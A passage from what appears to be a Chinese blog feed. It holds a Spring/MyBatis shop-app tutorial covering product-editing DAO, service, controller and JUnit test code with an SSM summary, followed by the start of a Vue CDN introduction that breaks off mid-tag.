product_id=#&#123;productId&#125; AND shop_id=#&#123;shop.shopId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ProductImgDao&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 根据 product id 删除商品 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteProductImgByProductId&quot;</span>&gt;</span>DELETE FROMtb_product_imgWHEREproduct_id=#&#123;productId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>language-xml复制代码</code></pre><ol><li>JUnit 单元测试</li></ol><pre><code class="hljs java">&lt;!-- PorductTest.java --&gt;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCQueryPorductByProductId</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<span class="hljs-type">long</span> <span class="hljs-variable">productId</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<span class="hljs-comment">// 初始化两个商品详情图实例作为 productId 为 1 的商品的详情图片</span><span class="hljs-comment">// 批量插入到商品详情图中</span><span class="hljs-type">ProductImg</span> <span class="hljs-variable">productImg1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductImg</span>();productImg1.setImgAddr(<span class="hljs-string">&quot;图片1&quot;</span>);productImg1.setImgDesc(<span class="hljs-string">&quot;测试图片1&quot;</span>);productImg1.setPriority(<span class="hljs-number">1</span>);productImg1.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());productImg1.setProductId(productId);<span class="hljs-type">ProductImg</span> <span class="hljs-variable">productImg2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductImg</span>();productImg2.setImgAddr(<span class="hljs-string">&quot;图片1&quot;</span>);productImg2.setImgDesc(<span class="hljs-string">&quot;测试图片1&quot;</span>);productImg2.setPriority(<span class="hljs-number">1</span>);productImg2.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());productImg2.setProductId(productId);List&lt;ProductImg&gt; productImgList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ProductImg&gt;();productImgList.add(productImg1);productImgList.add(productImg2);<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productImgDao.batchInsertProductImg(productImgList);assertEquals(<span class="hljs-number">2</span>, effectedNum);<span class="hljs-comment">// 查询productId 为1的商品信息并校验返回的详情图实例列表size 是否为2</span><span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productDao.queryProductById(productId);assertEquals(<span class="hljs-number">2</span>, product.getProductImgList().size());<span class="hljs-comment">// 删除新增的这两个商品详情图实例</span>effectedNum = productImgDao.deleteProductImgByProductId(productId);assertEquals(<span class="hljs-number">2</span>, effectedNum);&#125;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDUpdateProduct</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();<span class="hljs-type">ProductCategory</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategory</span>();<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();shop.setShopId(<span class="hljs-number">1L</span>);pc.setProductCategoryId(<span class="hljs-number">2L</span>);product.setProductId(<span class="hljs-number">1L</span>);product.setShop(shop);product.setProductName(<span class="hljs-string">&quot;第二个产品&quot;</span>);product.setProductCategory(pc);<span class="hljs-comment">// 修改 productId 为1的商品的名称</span><span class="hljs-comment">// 以及商品类别并校验影响的行数是否为 1</span><span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productDao.updateProduct(product);assertEquals(<span class="hljs-number">1</span>, effectedNum);&#125;&lt;!-- ProductImgDaoTest.java --&gt;<span class="hljs-meta">@Test</span><span class="hljs-meta">@Ignore</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCDeleteProductImgByProductId</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<span class="hljs-comment">// 删除新增的两条商品详情图片记录</span><span class="hljs-type">long</span> <span class="hljs-variable">productId</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productImgDao.deleteProductImgByProductId(productId);assertEquals(<span class="hljs-number">2</span>, effectedNum);&#125;language-java复制代码</code></pre><h4 id="6-2-2、Service-层"><a href="#6-2-2、Service-层" class="headerlink" title="6.2.2、Service 层"></a>6.2.2、Service 层</h4><ol><li>接口 ProductService.java</li></ol><pre><code class="hljs java"><span class="hljs-comment">// 通过商品 Id 查询唯一的商品信息(商品编辑)</span>Product <span class="hljs-title function_">getProductById</span><span class="hljs-params">(<span class="hljs-type">long</span> productId)</span>;<span class="hljs-comment">// 修改商品信息以及图片处理(商品编辑)</span>ProductExecution <span class="hljs-title function_">modifyProduct</span><span class="hljs-params">(Product product, ImageHolder thumbnail, List&lt;ImageHolder&gt; productImgList)</span> <span class="hljs-keyword">throws</span> ProductOperationException;language-java复制代码</code></pre><ol><li>实现类 ProductServiceImpl.java</li></ol><pre><code class="hljs java"><span class="hljs-comment">// 商品编辑，获取商品信息</span><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductById</span><span class="hljs-params">(<span class="hljs-type">long</span> productId)</span> &#123;<span class="hljs-keyword">return</span> productDao.queryProductById(productId);&#125;<span class="hljs-comment">// 商品编辑，修改商品信息</span><span class="hljs-meta">@Override</span><span class="hljs-meta">@Transactional</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * 思路：1.若缩略图参数有值，则处理缩略图，若原先存在缩略图则先删除再添加新图，之后获取缩略图相对路径并赋值给product</span><span class="hljs-comment"> * 2.若商品详情图列表参数有值，对商品详情图片列表进行同样的操作</span><span class="hljs-comment"> * 3.将tb_product_img下面的该商品原先的商品详情图记录全部清除</span><span class="hljs-comment"> * 4.更新tb_product_img 以及 tb_product的信息</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> ProductExecution <span class="hljs-title function_">modifyProduct</span><span class="hljs-params">(Product product, ImageHolder thumbnail, List&lt;ImageHolder&gt; productImgHolderList)</span><span class="hljs-keyword">throws</span> ProductOperationException &#123;<span class="hljs-comment">// 空值判断</span><span class="hljs-keyword">if</span>(product != <span class="hljs-literal">null</span> &amp;&amp; product.getShop() != <span class="hljs-literal">null</span> &amp;&amp; product.getShop().getShopId() != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">// 给商品设置上默认属性</span>product.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<span class="hljs-comment">// 若商品缩略图不为空且原有缩略图不为空则删除原有缩略图并添加</span><span class="hljs-keyword">if</span>(thumbnail != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">// 先获取一遍原有信息，因为原来的信息里有图片地址</span><span class="hljs-type">Product</span> <span class="hljs-variable">tempProduct</span> <span class="hljs-operator">=</span> productDao.queryProductById(product.getProductId());<span class="hljs-keyword">if</span>(tempProduct.getImgAddr() != <span class="hljs-literal">null</span>) &#123;ImageUtil.deleteFileOrPath(tempProduct.getImgAddr());&#125;addThumbnail(product, thumbnail);&#125;<span class="hljs-comment">// 如果有新存入的商品详情图，则将原来的删除，并添加新的图片</span><span class="hljs-keyword">if</span>(productImgHolderList != <span class="hljs-literal">null</span> &amp;&amp; productImgHolderList.size() &gt; <span class="hljs-number">0</span>) &#123;deleteProductImgList(product.getProductId());addProductImgList(product, productImgHolderList);&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 更新商品信息</span><span class="hljs-type">int</span> <span class="hljs-variable">effentedNum</span> <span class="hljs-operator">=</span> productDao.updateProduct(product);<span class="hljs-keyword">if</span>(effentedNum &lt;= <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductOperationException</span>(<span class="hljs-string">&quot;更新商品信息失败&quot;</span>);&#125;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductExecution</span>(ProductStateEnum.SUCCESS, product);&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductOperationException</span>(<span class="hljs-string">&quot;更新商品信息失败:&quot;</span> + e.toString());&#125;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductExecution</span>(ProductStateEnum.EMPTY_LIST);&#125;&#125;<span class="hljs-comment">// 根据 product id 删除商品详情图</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProductImgList</span><span class="hljs-params">(Long productId)</span> &#123;<span class="hljs-comment">// 根据 productId 获取原来的图片</span>List&lt;ProductImg&gt; productImgList = productImgDao.queryProductImgList(productId);<span class="hljs-comment">// 删除原来的图片</span><span class="hljs-keyword">for</span>(ProductImg productImg : productImgList) &#123;ImageUtil.deleteFileOrPath(productImg.getImgAddr());&#125;<span class="hljs-comment">// 删除数据库里原有图片的信息</span>productImgDao.deleteProductImgByProductId(productId);language-java复制代码</code></pre><ol><li>测试 ProductServiceTest.java</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testModifyProduct</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ShopOperationException, FileNotFoundException &#123;<span class="hljs-comment">// 创建shopId 为1 且productCategoryId 为 1的商品实例并给其成员变量赋值</span><span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();shop.setShopId(<span class="hljs-number">1L</span>);<span class="hljs-type">ProductCategory</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategory</span>();pc.setProductCategoryId(<span class="hljs-number">1L</span>);product.setProductId(<span class="hljs-number">1L</span>);product.setShop(shop);product.setProductCategory(pc);product.setProductName(<span class="hljs-string">&quot;正式的商品Test&quot;</span>);product.setProductDesc(<span class="hljs-string">&quot;正式的商品Test&quot;</span>);<span class="hljs-comment">// 创建缩略图文件流</span><span class="hljs-type">File</span> <span class="hljs-variable">thumbnailFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src.jpeg&quot;</span>);<span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(thumbnailFile);<span class="hljs-type">ImageHolder</span> <span class="hljs-variable">thumbnail</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(thumbnailFile.getName(), is);<span class="hljs-comment">// 创建两个商品详情图文件流并将他们添加到详情图列表中</span><span class="hljs-type">File</span> <span class="hljs-variable">productImg1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src.jpeg&quot;</span>);<span class="hljs-type">InputStream</span> <span class="hljs-variable">is1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(productImg1);<span class="hljs-type">File</span> <span class="hljs-variable">productImg2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src2.jpeg&quot;</span>);<span class="hljs-type">InputStream</span> <span class="hljs-variable">is2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(productImg2);List&lt;ImageHolder&gt; productImgList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ImageHolder&gt;();productImgList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(productImg1.getName(), is1));productImgList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(productImg2.getName(), is2));<span class="hljs-comment">// 添加商品并验证</span><span class="hljs-type">ProductExecution</span> <span class="hljs-variable">pe</span> <span class="hljs-operator">=</span> productService.modifyProduct(product, thumbnail, productImgList);assertEquals(ProductStateEnum.SUCCESS.getState(), pe.getState());&#125;language-java复制代码</code></pre><h4 id="6-2-3-Controller-层-ProductCategoryManagementController-java"><a href="#6-2-3-Controller-层-ProductCategoryManagementController-java" class="headerlink" title="6.2.3 Controller 层 ProductCategoryManagementController.java"></a>6.2.3 Controller 层 ProductCategoryManagementController.java</h4><pre><code class="hljs java"><span class="hljs-comment">// 商品编辑</span><span class="hljs-meta">@RequestMapping(value=&quot;/modifyproduct&quot;, method=RequestMethod.POST)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Map&lt;String, Object&gt; <span class="hljs-title function_">modifyProduct</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;Map&lt;String, Object&gt; modelMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<span class="hljs-comment">//是商品编辑时候嗲用还是上下架操作的时候调用</span><span class="hljs-comment">//若为前者则进行验证码判断，后者则跳过验证码判断</span><span class="hljs-type">boolean</span> <span class="hljs-variable">statusChange</span> <span class="hljs-operator">=</span> HttpServletRequestUtil.getBoolean(request, <span class="hljs-string">&quot;statusChange&quot;</span>);<span class="hljs-comment">// 验证码判断</span><span class="hljs-keyword">if</span>(!statusChange &amp;&amp; !CodeUtil.checkVerifyCode(request)) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;输入了错误的验证码&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-comment">// 接受前端参数的变量的初始化，包括商品，缩略图，详情图列表实体类</span><span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-type">ImageHolder</span> <span class="hljs-variable">thumbnail</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;List&lt;ImageHolder&gt; productImgList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ImageHolder&gt;();<span class="hljs-type">CommonsMultipartResolver</span> <span class="hljs-variable">multipartResolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsMultipartResolver</span>(request.getSession().getServletContext());<span class="hljs-comment">// 若请求中存在文件流，则取相关的文件（包括缩略图和详情图）</span><span class="hljs-keyword">try</span> &#123;<span class="hljs-keyword">if</span>(multipartResolver.isMultipart(request)) &#123;handleImage(request, productImgList);&#125;&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;上传图片不能为空&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">productStr</span> <span class="hljs-operator">=</span> HttpServletRequestUtil.getString(request, <span class="hljs-string">&quot;productStr&quot;</span>);<span class="hljs-comment">// 尝试获取前端传过来的表单string流并将其转成Product实体类</span>product = mapper.readValue(productStr, Product.class);&#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-comment">// 非空判断</span><span class="hljs-keyword">if</span>(product != <span class="hljs-literal">null</span>) &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 从session中获取当前店铺的Id并赋值给product, 减少对前端数据的依赖</span><span class="hljs-type">Shop</span> <span class="hljs-variable">currentShop</span> <span class="hljs-operator">=</span> (Shop) request.getSession().getAttribute(<span class="hljs-string">&quot;currentShop&quot;</span>);<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();shop.setShopId(currentShop.getShopId());product.setShop(shop);<span class="hljs-comment">// 开始进行商品信息变更操作</span><span class="hljs-type">ProductExecution</span> <span class="hljs-variable">pe</span> <span class="hljs-operator">=</span> productService.modifyProduct(product, thumbnail, productImgList);<span class="hljs-keyword">if</span>(pe.getState() == ProductStateEnum.SUCCESS.getState()) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">true</span>);&#125;<span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, pe.getStateInfo());&#125;&#125; <span class="hljs-keyword">catch</span>(RuntimeException e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());<span class="hljs-keyword">return</span> modelMap;&#125;&#125; <span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;请输入商品信息&quot;</span>);&#125;<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleImage</span><span class="hljs-params">(HttpServletRequest request, List&lt;ImageHolder&gt; productImgList)</span> <span class="hljs-keyword">throws</span> IOException &#123;ImageHolder thumbnail;<span class="hljs-type">MultipartHttpServletRequest</span> <span class="hljs-variable">multipartRequest</span> <span class="hljs-operator">=</span> (MultipartHttpServletRequest) request;<span class="hljs-comment">// 取出缩略图并构建ImageHolder对象</span><span class="hljs-type">CommonsMultipartFile</span> <span class="hljs-variable">thumbnailFile</span> <span class="hljs-operator">=</span> (CommonsMultipartFile) multipartRequest.getFile(<span class="hljs-string">&quot;thumbnailFile&quot;</span>);<span class="hljs-keyword">if</span>(thumbnailFile != <span class="hljs-literal">null</span>) &#123;thumbnail = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(thumbnailFile.getOriginalFilename(), thumbnailFile.getInputStream());&#125;<span class="hljs-comment">// 取出详情图列表并构建List&lt;ImageHolder&gt;列表对象，最多支持六张图片上传</span><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; IMAGEMAXCOUNT; i++) &#123;<span class="hljs-type">CommonsMultipartFile</span> <span class="hljs-variable">productImgFile</span> <span class="hljs-operator">=</span> (CommonsMultipartFile) multipartRequest.getFile(<span class="hljs-string">&quot;productImg&quot;</span> + i);<span class="hljs-keyword">if</span>(productImgFile != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">// 若取出的第i个详情图片文件流不为空，则将其加入详情图列表</span><span class="hljs-type">ImageHolder</span> <span class="hljs-variable">productImg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(productImgFile.getOriginalFilename(), productImgFile.getInputStream());productImgList.add(productImg);&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 若取出的第i个详情图片文件流为空，则终止循环</span><span class="hljs-keyword">break</span>;&#125;&#125;&#125;language-java复制代码</code></pre><h2 id="6-3-商品列表展示"><a href="#6-3-商品列表展示" class="headerlink" title="6.3 商品列表展示"></a>6.3 商品列表展示</h2><h1 id="第七章-首页"><a href="#第七章-首页" class="headerlink" title="第七章 首页"></a>第七章 首页</h1><p>目标: 头条读取以及滚动播放；一级类别列表的获取</p><h2 id="7-1"><a href="#7-1" class="headerlink" title="7.1"></a>7.1</h2><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="SSM-框架实现功能的步骤"><a href="#SSM-框架实现功能的步骤" class="headerlink" title="SSM 框架实现功能的步骤"></a>SSM 框架实现功能的步骤</h2><ol><li>在 dao 层</li></ol><ul><li>创建出相应的接口</li><li>定义相关的方法</li></ul><ol><li>在 mapper 中</li></ol><ul><li>在 resources&#x2F;mapper 下面创建出与 dao 层一一对应的 xml 文件</li><li>在 xml 文件中定义出方法所需要的 SQL</li></ul><ol><li>在 service 层</li></ol><ul><li>实现类继承接口，包含类注解(@Service)，</li><li>使用注解(@Autowired)将 dao 层接口注入进来</li><li>调用 dao 层的方法，将我们需要的数据返回到 Controller 去</li></ul><ol><li>在 controller 层</li></ol><ul><li>包含有注解(@Controller，@RequestMapping(“&#x2F;url”))的类</li><li>使用注解(@Autowired)将 dao 层接口注入进来</li><li>创建包含有注解(@RequestMapping, @ResponseBody)的方法。</li><li>调用 dao 层接口的方法获取数据后，直接将数据返回前台。</li></ul><hr><h1 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h1><h2 id="Junit-测试步骤"><a href="#Junit-测试步骤" class="headerlink" title="Junit 测试步骤"></a>Junit 测试步骤</h2><h4 id="1、定义一个基类"><a href="#1、定义一个基类" class="headerlink" title="1、定义一个基类"></a>1、定义一个基类</h4><ol><li>一个包含类注解(@RunWith(SpringJunit4ClassRunner.class))的类,指定使用那个类来单元测试</li><li>一个包含类注解(@ContextConfiguration({“1.xml”,”2.xml”}))的类,指定 junit spring 配置文件的文件，1.xml 为 junit 的 dao 层做服务的，2.xml 为 service 单元测试做服务配置的。</li></ol><h4 id="2、定义一个实现类"><a href="#2、定义一个实现类" class="headerlink" title="2、定义一个实现类"></a>2、定义一个实现类</h4><ol><li>定义一个方法，包含注解(@Test)的测试方法。</li></ol><h2 id="Junit-拓展"><a href="#Junit-拓展" class="headerlink" title="Junit 拓展"></a>Junit 拓展</h2><h4 id="Junit-测试回环"><a href="#Junit-测试回环" class="headerlink" title="Junit 测试回环"></a>Junit 测试回环</h4><p>测试回环是通过测试进行的数据插入，再通过测试进行数据的删除，在测试中推荐使用，这样对数据库基本没影响</p><h4 id="Junit-顺序执行"><a href="#Junit-顺序执行" class="headerlink" title="Junit 顺序执行"></a>Junit 顺序执行</h4><p>做单元测试是，默认是不一定安装顺序执行测试的，但是有时候需要按顺序的执行测试，所以该注解是安装名字的顺序来执行测试。可在测试方法名字添加顺序:testAxxx, testBxxx</p><hr><h2 id="SSM-重点知识"><a href="#SSM-重点知识" class="headerlink" title="SSM 重点知识"></a>SSM 重点知识</h2><ol><li>SpringMVC: DispatcherServlet</li><li>Spring: IOC 和 AOP</li></ol><ul><li>IOC</li><li>Aop<br>例如，增删改查的操作，都需要做权限验证，我们并不希望权限验证的代码杂糅在我们增删改查的方法里，我们可以通过 AOP 在程序运行时候动态的将我们权限代码植入到我们的增删改查方法的前面，以完成权限的验证。AOP 的实现方式，就是动态代理。动态代理有 JDK 和 CJL 两种方式实现。</li></ul><ol><li>MyBatis:ORM</li></ol><ul><li>ORM 就是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。</li><li>关系映射的实现方式。</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue</title>
      <link href="/2021/06/23/Vue/"/>
      <url>/2021/06/23/Vue/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-CDN开发上"><a href="#第一章-CDN开发上" class="headerlink" title="第一章 CDN开发上"></a>第一章 CDN开发上</h1><h2 id="1-1、开发环境介绍"><a href="#1-1、开发环境介绍" class="headerlink" title="1.1、开发环境介绍"></a>1.1、开发环境介绍</h2><pre><code class="hljs bash">$ node --versionv14.15.1$ npm --version7.17.0$ vue --version@vue/cli 4.5.13</code></pre><hr><h2 id="1-2、CDN方式使用Vue"><a href="#1-2、CDN方式使用Vue" class="headerlink" title="1.2、CDN方式使用Vue"></a>1.2、CDN方式使用Vue</h2><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>language-html复制代码</code></pre><hr><h2 id="1-3、vue-app的基本结构"><a href="#1-3、vue-app的基本结构" class="headerlink" title="1.3、vue-app的基本结构"></a>1.3、vue-app的基本结构</h2><h3 id="1-3-1、HTML代码"><a href="#1-3-1、HTML代码" class="headerlink" title="1.3.1、HTML代码"></a>1.3.1、HTML代码</h3><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span>  &#123;&#123; message &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>language-html复制代码</code></pre><h3 id="1-3-2、JS代码"><a href="#1-3-2、JS代码" class="headerlink" title="1.3.2、JS代码"></a>1.3.2、JS代码</h3><pre><code class="hljs js"><span class="hljs-keyword">var</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;  <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>, <span class="hljs-comment">// 将 Vue 应用会将其挂载到一个 DOM 元素上（#app）</span>  <span class="hljs-attr">data</span>: &#123;    <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Hello Vue!&#x27;</span>  &#125;&#125;)language-js复制代码</code></pre><hr><h3 id="1-4、好玩的Vue语法"><a href="#1-4、好玩的Vue语法" class="headerlink" title="1.4、好玩的Vue语法"></a>1.4、好玩的Vue语法</h3><h4 id="1-4-1、HTML代码"><a href="#1-4-1、HTML代码" class="headerlink" title="1.4.1、HTML代码"></a>1.4.1、HTML代码</h4><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./styles.css&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue CND<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-bind&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>hello &#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!-- 绑定data中的数据 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; greet(&#x27;night&#x27;) &#125;&#125;<span 